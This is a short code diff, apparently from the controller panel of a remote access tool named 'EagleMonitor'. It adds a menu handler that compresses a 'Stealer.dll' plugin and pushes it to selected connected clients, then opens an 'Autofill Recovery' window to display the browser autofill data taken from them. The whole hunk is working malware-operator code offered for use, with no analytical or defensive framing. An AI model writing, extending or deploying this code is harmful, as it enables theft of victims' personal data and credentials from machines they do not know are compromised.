@@ -224,6 +224,40 @@ namespace EagleMonitor
             }
         }
 
+        private void autofillToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            foreach (DataGridViewRow dataGridViewRow in dataGridView1.SelectedRows)
+            {
+                string IP = dataGridViewRow.Cells[2].Value.ToString();
+                AutofillPacket autofillPacket = new AutofillPacket
+                {
+                    plugin = Compressor.QuickLZ.Compress(File.ReadAllBytes(Utils.Miscellaneous.GPath + "\\Plugins\\Stealer.dll"), 1)
+                };
+                try
+                {
+                    if (ClientHandler.ClientHandlersList[IP].autofillForm != null)
+                    { ClientHandler.ClientHandlersList[IP].autofillForm.Text = "Autofill Recovery: " + ClientHandler.ClientHandlersList[IP].IP; ClientHandler.ClientHandlersList[IP].autofillForm.label1.Text = "Autofill Recovery: " + ClientHandler.ClientHandlersList[IP].IP; ClientHandler.ClientHandlersList[IP].autofillForm.Show(); }
+                    else
+                    {
+                        ClientHandler.ClientHandlersList[IP].autofillForm = new AutofillForm(ClientHandler.ClientHandlersList[IP])
+                        {
+                            Text = "Autofill Recovery: " + ClientHandler.ClientHandlersList[IP].HWID
+                        }; ClientHandler.ClientHandlersList[IP].autofillForm.label1.Text = "Autofill Recovery: " + ClientHandler.ClientHandlersList[IP].IP; ClientHandler.ClientHandlersList[IP].autofillForm.Show();
+                    }
+                }
+                catch (Exception)
+                {
+                    ClientHandler.ClientHandlersList[IP].autofillForm = new AutofillForm(ClientHandler.ClientHandlersList[IP]); ClientHandler.ClientHandlersList[IP].autofillForm.Text = "Autofill Recovery: " + ClientHandler.ClientHandlersList[IP].HWID; ClientHandler.ClientHandlersList[IP].autofillForm.label1.Text = "Autofill Recovery: " + ClientHandler.ClientHandlersList[IP].IP; ClientHandler.ClientHandlersList[IP].autofillForm.Show();
+                }
+                finally
+                {
+                    ClientHandler.ClientHandlersList[IP].autofillForm.loadingCircle1.Visible = true;
+                    ClientHandler.ClientHandlersList[IP].autofillForm.loadingCircle1.Active = true;
+                    ClientHandler.ClientHandlersList[IP].SendPacket(autofillPacket);
+                }
+            }
+        }
+
         private void fileManagerToolStripMenuItem_Click(object sender, EventArgs e)
         {
             foreach (DataGridViewRow dataGridViewRow in dataGridView1.SelectedRows)
